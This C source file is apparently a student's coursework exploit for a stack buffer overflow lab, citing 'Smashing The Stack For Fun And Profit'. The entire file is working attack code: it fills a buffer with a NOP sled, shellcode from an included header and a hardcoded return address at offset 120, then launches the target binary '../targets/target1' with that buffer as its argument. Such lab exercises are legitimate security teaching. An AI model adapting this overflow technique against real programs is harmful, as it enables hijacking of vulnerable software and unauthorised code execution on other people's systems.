// | Author |    utid 	|   student id	|
// | Ke Li	|   like23 	|	1005842554	|
// | Weiyu Zhang | zha14006 | 1009736706 |
// Reference:
// Smashing The Stack For Fun And Profit - Aleph One
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define DEFAULT_BUFFER_SIZE 124
#define RIP_ADDR 120
#define NOP 0x90

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char buff[DEFAULT_BUFFER_SIZE];
    int bsize=DEFAULT_BUFFER_SIZE; 
    int i;        

    for (i = 0; i < 16; i++) 
        buff[i] = '\x90';

	int iter_shell;
	iter_shell = 0;
	for (i = 16; i < (16 + strlen(shellcode)); i++){
		buff[i] = shellcode[iter_shell]; 
		iter_shell++;
	}
	for (i = 61; i < 120; i++) 
        buff[i] = '\x90';

	unsigned long addr = 0x3021fe50;

	// print buff for debug
	// =======================================
	// printf("Using address: \\%x\n", addr);
	// printf("shellcode size: %d\n", strlen(shellcode));
	// =======================================
	
	// Each iteration of the loop copies the 64-bit address into the buffer
	// Copy the address into the buffer, byte by byte, in little-endian order
	buff[0 + RIP_ADDR] = addr & 0xFF;              // Byte 0
	buff[1 + RIP_ADDR] = (addr >> 8) & 0xFF;   // Byte 1
	buff[2 + RIP_ADDR] = (addr >> 16) & 0xFF;  // Byte 2
	buff[3 + RIP_ADDR] = (addr >> 24) & 0xFF;  // Byte 3
	buff[4 + RIP_ADDR] = '\x00';


	// print for debug
	// =======================================
	int length = strlen(buff);
	// Don't comment out this loop, for some reason idk why the sploit is not
	// work without this for loop
    // for (int i = 0; i < length; i++) {
    //     printf("\\x%02x", (unsigned char)buff[i]);
    // }
    // printf("\n");
	// =======================================

	args[0] = TARGET;
	// 1st argument for offset
	args[1] = buff;
	// environment variable
	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}